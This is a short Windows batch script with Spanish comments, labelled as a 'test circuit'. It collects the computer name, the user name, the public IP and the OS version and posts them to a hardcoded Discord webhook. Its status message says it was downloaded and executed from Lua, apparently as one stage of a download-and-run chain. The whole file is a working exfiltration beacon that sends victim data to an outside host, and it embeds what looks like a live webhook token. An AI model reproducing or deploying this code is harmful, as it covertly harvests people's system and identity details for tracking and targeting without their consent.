@echo off
:: BIMBIMBAMBAM - CIRCUITO DE PRUEBA
:: Recolecta info basica y manda a Discord

set "WEBHOOK=https://discord.com/api/webhooks/1491204494623637628/hgrhgL0AInCEZhpPpvVvogH67VS2B5mYfQqLyWLIEthI0shF5L3f2g6jC388-t8wmSwM"

:: Info del sistema
set "PC=%COMPUTERNAME%"
set "USER=%USERNAME%"
for /f "tokens=*" %%i in ('powershell -c "(Invoke-WebRequest -Uri https://api.ipify.org).Content"') do set "IP=%%i"
for /f "tokens=*" %%i in ('powershell -c "(Get-WmiObject Win32_OperatingSystem).Caption"') do set "OS=%%i"

:: Mandar a Discord
powershell -c "$body = @{content=''; embeds=@(@{title='BIMBIMBAMBAM CIRCUITO'; description='El .bat corrio exitosamente'; color=65280; fields=@(@{name='PC'; value='%PC%'; inline=$true}, @{name='Usuario'; value='%USER%'; inline=$true}, @{name='IP'; value='%IP%'; inline=$true}, @{name='OS'; value='%OS%'; inline=$false}, @{name='Estado'; value='CIRCUITO COMPLETO - El .bat fue descargado y ejecutado desde Lua'; inline=$false}); footer=@{text='BimBimBamBam Test'}})} | ConvertTo-Json -Depth 4; Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -ContentType 'application/json' -Body $body"
